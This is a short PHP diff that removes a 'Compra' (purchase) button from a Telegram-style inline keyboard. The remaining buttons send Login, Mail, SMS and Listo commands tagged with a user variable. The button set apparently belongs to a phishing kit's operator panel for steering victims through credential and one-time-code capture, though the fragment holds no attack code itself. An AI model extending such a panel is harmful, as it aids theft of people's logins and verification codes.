@@ -36,7 +36,6 @@ $botones = json_encode([
             ['text' => '🔁 Login', 'callback_data' => "LOGIN|$usuario"],
             ['text' => '📩 Mail', 'callback_data' => "MAIL|$usuario"],
             ['text' => '📩 SMS', 'callback_data' => "SMS|$usuario"],
-            ['text' => '💸 Compra', 'callback_data' => "COMPRA|$usuario"],
             ['text' => '✅ Listo', 'callback_data' => "LISTO|$usuario"]
         ],
         [
